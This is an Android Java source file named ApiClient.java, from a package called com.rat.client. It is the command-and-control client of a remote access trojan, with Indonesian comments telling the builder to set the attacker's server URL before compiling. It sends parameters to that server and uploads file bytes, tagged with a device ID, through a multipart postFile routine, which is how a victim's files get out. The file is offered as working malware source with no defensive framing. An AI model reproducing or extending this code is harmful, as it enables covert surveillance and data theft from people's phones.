// language: Java, file: ApiClient.java, target: Android API 21+
// HTTP polling ke C2 server — ganti SERVER_URL sebelum compile
package com.rat.client;

import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.*;

public class ApiClient {

    // ← GANTI INI ke URL server dj
    public static final String SERVER_URL = "https://SERVERMU/rat-server/api.php";

    public static String post(Map<String, String> params) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);

            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> e : params.entrySet()) {
                if (sb.length() > 0) sb.append('&');
                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"));
                sb.append('=');
                sb.append(URLEncoder.encode(e.getValue(), "UTF-8"));
            }

            byte[] body = sb.toString().getBytes("UTF-8");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(body.length));

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body);
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                BufferedReader br = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(), "UTF-8"));
                StringBuilder res = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) res.append(line);
                return res.toString();
            }
        } catch (Exception e) {
            Log.e("RAT", "post error: " + e.getMessage());
        }
        return null;
    }

    public static String postFile(String action, String deviceId,
                                   String name, String path, byte[] data) {
        try {
            String boundary = "----RATBoundary" + System.currentTimeMillis();
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            conn.setRequestProperty("Content-Type",
                "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                // action
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"action\"\r\n\r\n");
                dos.writeBytes(action + "\r\n");
                // device_id
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n");
                dos.writeBytes(deviceId + "\r\n");
                // name
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"name\"\r\n\r\n");
                dos.writeBytes(name + "\r\n");
                // file
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""
                    + name + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                dos.write(data);
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
            }

            BufferedReader br = new BufferedReader(
                new InputStreamReader(conn.getInputStream(), "UTF-8"));
            StringBuilder res = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) res.append(line);
            return res.toString();
        } catch (Exception e) {
            Log.e("RAT", "postFile error: " + e.getMessage());
        }
        return null;
    }
}